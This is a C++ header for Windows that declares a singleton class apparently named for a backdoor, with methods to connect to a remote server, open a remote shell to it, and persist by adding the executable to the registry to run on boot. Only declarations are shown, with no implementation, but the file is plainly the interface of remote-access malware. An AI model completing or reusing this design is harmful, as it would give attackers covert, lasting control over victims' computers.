#define _WIN32_WINNT 0x501
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>

#define RECV_BUFLEN 512
#define CMD_BUFLEN 4096

class bacc {
    static bacc* instance;                    // grab previous instance if it exists, otherwise create a new one :v
    SOCKET connectSocket;
    void log(std::string line);

public:
    bacc();
    ~bacc();
    static bacc* get_instance();
    void connect_to_server(std::string ip, std::string port);
    void pop_shell();                         // opens a remote shell to the servers
    void persist(std::string programName);    // add executable to the registry to start on boot
};